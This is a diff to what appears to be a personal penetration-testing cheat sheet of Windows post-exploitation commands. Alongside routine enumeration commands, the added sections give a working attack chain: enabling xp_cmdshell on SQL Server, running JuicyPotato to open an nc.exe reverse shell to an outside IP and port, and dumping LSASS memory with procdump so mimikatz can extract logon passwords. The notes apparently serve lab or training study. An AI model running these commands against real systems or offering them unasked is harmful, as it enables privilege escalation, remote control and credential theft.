@@ -137,6 +137,11 @@ crackmapexec smb <ip> -u '' -p ''  # if using CCE
 -----------------------------------------------------------------------------------------
 # Updating commands
 
+## Finding file
+```bash
+dir <file> /s # recommended from C:\
+```
+
 ## Network
 ```bash
 ipconfig /all
@@ -170,7 +175,8 @@ Get-WmiObject -Class Win32_Product |  select Name, Version # as previous but Pow
 ## Running processes
 ```bash
 netstat -ano # TCP and UDP connections in localhost
-netstat -ano | findstr ":8080"
+netstat -ano | findstr ":8080" # with find string which contains :8080
+tasklist # using for cathing name of process recommended with findstr
 ```
 
 ## Logged-In Users && Current User && User Privileges && Groups
@@ -183,6 +189,29 @@ net user # get all users in system
 net localgroup # get all groups in system
 net localgroup <group> # can be administrators used for checking details about a group
 net accounts # password policy and account info
+```
+
+## SQL Server with privileged user
+```bash
+impacket-mssqlclient <user>@<target_ip> -windows-auth # password required
+# Comands in sql server after access
+SQL> enable_xp_cmdshell # must enable this, stored procedure to run operating system commands
+SQL> xp_cmdshell whoami # confirm working
+xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.15.65 9001 -e cmd.exe" -t *
+# Starting reverse shell to your local machine by JuicyPotato but you may know that it is installed and running port(53375)
+```
+
+## SeDebugPrivilege
+```bash
+Computer Settings > Windows Settings > Security Settings # setting as admin
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+# ^ dump process memory by procdump.exe and choosing lsass process because
+# it stores creds after user log in system but can be anouther process
+mimikatz.exe # see dumped creds form previous command
+# commands into mimikatz
+loglog
+sekurlsa::minidump <file.dmp> # lsass.dmp
+sekurlsa::logonpasswords # dumped creds
 ```
 
 
